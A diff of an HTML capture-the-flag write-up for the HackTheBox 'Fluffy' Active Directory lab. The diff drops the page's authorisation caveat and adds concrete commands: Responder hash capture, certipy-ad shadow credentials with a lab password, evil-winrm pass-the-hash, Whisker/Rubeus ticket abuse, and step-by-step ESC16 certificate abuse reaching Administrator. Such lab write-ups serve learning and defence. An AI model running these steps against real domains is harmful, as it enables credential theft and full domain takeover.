@@ -15,7 +15,7 @@
   <!-- Header -->
   <header>
     <h1>Fluffy Writeup</h1>
-    <p>HackTheBox Labs — post-exploitation walkthrough and analysis</p>
+    <p>HackTheBox</p>
     <nav aria-label="Primary navigation">
       <ul>
         <li><a href="/index.html">Home</a></li>
@@ -39,13 +39,6 @@
         with an assumed initial breach. The scenario starts from low-privileged credentials and
         progresses through enumeration, discovery of service accounts, credential harvesting, and
         abuse of Active Directory Certificate Services to obtain Administrator-level access.
-      </p>
-
-      <p>
-        The writeup below describes the reasoning and observations made at each stage rather than a
-        step-by-step "how-to." Where I include tool output or commands, these are present as part of
-        documenting what was run during the engagement. If you are reproducing this in a lab
-        environment, ensure you have authorization.
       </p>
 
       <p><strong>Target IP:</strong> <code>10.10.11.69</code></p>
@@ -73,7 +66,7 @@
 
       <h3>SMB (Port 445)</h3>
       <p>
-        With initial credentials we enumerated available SMB shares. SMB shares on domain controllers
+        With initial credentials, I enumerated available SMB shares. SMB shares on domain controllers
         or file servers frequently contain sensitive configuration files, archives, or username lists
         that can be useful for privilege escalation or lateral movement.
       </p>
@@ -240,18 +233,16 @@
         future certificate-based escalation.
       </p>
 
-      <h4>Responder / NTLM capture (conceptual)</h4>
+      <h4>Responder / NTLM capture</h4>
       <p>
         To validate whether outbound/UNC-style references from the library file resulted in an
-        authentication attempt, I set up a listener in my lab to observe any NTLM authentication
-        events coming from the target. This is a diagnostic technique used in controlled assessments
-        to determine whether network resource references trigger authentication flows that can be
-        harvested. In this engagement it produced an NTLMv2 capture for user <code>p.agila</code>.
+        authentication attempt, I set up responder to observe any NTLM authentication
+        events coming from the target. I captured the NTLMv2 user <code>p.agila</code>.
       </p>
 
       <figure>
         <img src="images/Pasted image 20250918145928.png" alt="Responder captured NTLM hash screenshot" />
-        <figcaption>Responder output showing an NTLM capture attributed to a domain principal.</figcaption>
+        <figcaption>NTLM hash captured by Responder.</figcaption>
       </figure>
 
       <h4>Hashcat cracking</h4>
@@ -310,7 +301,7 @@
 
       <h3>Shadow Credentials Attack</h3>
       <p>
-        User certipy-ad to perform a shadow credentials attack for the winrm_svc user. 
+        Used certipy-ad to perform a shadow credentials attack for the winrm_svc user. 
         <code>certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account ca_svc</code>
         This attack is successful and I receive the NT hash for winrm_svc.
       </p>
@@ -320,7 +311,7 @@
         <figcaption>Captured NT hash for winrm_svc</figcaption>
       </figure>
 
-      <h3>Interactive shell as service account</h3>
+      <h3>Interactive shell as winrm service account</h3>
       <pre><code>evil-winrm -i 10.10.11.69 -H &lt;winrm_svc-hash&gt; -u winrm_svc</code></pre>
       <figure>
         <img src="images/initial-access-fluffy.png" alt="Evil-WinRM session screenshot" />
@@ -333,11 +324,42 @@
         privileges, processes, and interesting files. WinPEAS and similar enumeration tools surfaced
         a number of findings including group memberships, service-related ACLs, and artifacts
         indicating CA-related permissions for <code>ca_svc</code> I also ran SharpHound.exe and used 
-        BloodHound to determine privilege escalation. 
+        BloodHound to determine privilege escalation paths. 
       </p>
 
+      <p>After some review of the bloodhound data, I decided to escalate my privileges from winrm_svc to ca_svc.
+        The ca_svc account has CA privileges which could allow me to escalate to domain admin.
+      </p>
 
-      <h3>Certificate abuse and ESC16-style path (conceptual)</h3>
+      <img src="images/bh-showing-generic-all-over-ca-fluff.png" alt="CA_SVC path to domain controller">
+
+
+      <h4>Privilege Escalation from winrm_svc user to ca_svc user</h4>
+       <p>It also looks like privilege escalation from winrm_svc to ca_svc 
+        could be achieved using Whisker as suggested by the BloodHound abuse suggestion.
+      </p>
+
+      <p>Since I am a member of the "Service Accounts" group, I have GenericWrite over the ca_svc user. I can use BloodHound's 
+        suggested attack path with Whisker to capture the ca_svc credentials.</p>
+        <img src="images/bh-route-from-winrm-to-ca-fluff.png"alt="Bloodhound path from winrm_svc to ca_svc">
+
+        <code>.\Whisker.exe add /target:ca_svc</code>
+
+        <p>Running Whisker results in a Rubeus code output for the ca_svc user which I can use to get a TGT for the ca_svc user.
+          Pasting the Whisker output into Rubeus and executing it results in base64 encoded TGT.
+        </p>
+        <img src="images/rubeus-get-tgt-fluffy.png"alt="Whisker Output for Rubeus ">
+        <p>Save this TGT to a file. Base64 decode it and save as a .kirbi. Use impacket-ticketconverter
+          to convert the .kirbi file to .ccache. Save the .ccache as an environment variable.
+        </p>
+
+        <h3>Initial Access to CA_SVC User from WINRM_SVC User</h3>
+        <p>With the ca_svc NT hash, I can rerun the vulnerable certificate checks with
+           certipy-ad. The output suggests a possible ESC16 attack.
+        </p>
+
+
+      <h3>Certificate abuse and ESC16-style path</h3>
       <p>
         The CA in this environment allowed a sequence of actions where a service account with specific
         template rights could request a certificate for another account, and by adjusting attributes
@@ -346,21 +368,72 @@
         authentication as the domain Administrator.
       </p>
 
+       <h2>Step 1: Read initial UPN of the victim account (Optional — for restoration)</h2>
+      <pre><code>certipy-ad account \
+    -u 'ca_svc@fluffy.htb' -k \
+    -dc-ip '10.10.11.69' -user 'ca_svc' -target 'DC01.FLUFFY.HTB'\
+    read</code></pre>
+
       <figure>
-        <img src="images/Pasted image 20250920155111.png" alt="Certificate request screenshot" />
-        <figcaption>Certificate request and resulting authentication artifacts used to obtain Administrator access.</figcaption>
+        <img src="images/Pasted image 20250920154116.png" alt="Certipy read account screenshot" />
+        <figcaption>
+          UPN: <code>ca_svc@fluffy.htb</code> <br/>
+          SPN: <code>ADCS/ca.fluffy.htb</code>
+        </figcaption>
       </figure>
 
+      <h2>Step 2: Update the victim account's UPN to the target administrator’s <code>sAMAccountName</code></h2>
+      <pre><code>certipy-ad account \
+    -u 'ca_svc@fluffy.htb' -k \
+    -dc-ip '10.10.11.69' -upn 'administrator' \
+    -user 'ca_svc' -target 'DC01.FLUFFY.HTB' update</code></pre>
+
+      <figure>
+        <img src="images/Pasted image 20250920154640.png" alt="UPN update screenshot" />
+        <figcaption>
+          Note: UPN for <code>administrator</code> must be lowercase or it will fail.
+        </figcaption>
+      </figure>
+
+      <p>Not sure if a new TGT is needed at this point (TBD).</p>
+      <pre><code>certipy-ad shadow \
+    -u 'ca_svc@fluffy.htb' -k \
+    -dc-ip '10.10.11.69' -account 'ca_svc' -target 'DC01.FLUFFY.HTB' \
+    auto</code></pre>
+
+      <h2>Step 3: Request a certificate as the "victim" user</h2>
       <p>
-        After successfully authenticating as Administrator, I validated access and captured the
-        Administrator hash and session evidence. The remainder of the writeup documents verification
-        steps and re-enumeration to record what administrative-level privileges allowed.
+        Use any suitable client authentication template (e.g., <code>User</code>) against the ESC16-vulnerable CA.  
+        Because ESC16 omits the SID extension, the certificate will be valid for escalation.
       </p>
+      <pre><code>certipy-ad req \
+    -k -dc-ip '10.10.11.69' \
+    -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' \
+    -template 'User'</code></pre>
 
       <figure>
-        <img src="images/Pasted image 20250920162815.png" alt="Administrator hash obtained screenshot" />
-        <figcaption>Administrator-level credential material captured during the lab exercise.</figcaption>
+        <img src="images/Pasted image 20250920155111.png" alt="Certificate request success screenshot" />
+        <figcaption>
+          🎉 Success — received <code>administrator.pfx</code>.
+        </figcaption>
       </figure>
+
+      <h2>Step 4: Revert the "victim" account’s UPN</h2>
+      <p><strong>Important:</strong> Do not skip this step, or authentication will fail.</p>
+      <pre><code>certipy-ad account \
+    -u 'ca_svc' -k \
+    -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -upn 'ca_svc@fluffy.htb' \
+    -user 'ca_svc' update</code></pre>
+
+      <figure>
+        <img src="images/restore-upn-fluffy.png" alt="UPN revert screenshot" />
+      </figure>
+
+      <h2>Step 5: Authenticate as the target administrator</h2>
+      <pre><code>certipy-ad auth \
+    -dc-ip '10.10.11.69' -pfx administrator.pfx \
+    -username 'administrator' -domain 'fluffy.htb'</code></pre>
+
 
       <h2>Remediation Recommendations</h2>
       <p>
@@ -400,7 +473,7 @@
   <!-- Footer -->
   <footer>
     <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener noreferrer">GitHub</a></p>
-    <p><a href="/../index.html">Back to Writeups</a> | <a href="../../index.html">Home</a></p>
+    <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="../../index.html">Home</a></p>
   </footer>
 
 </body>
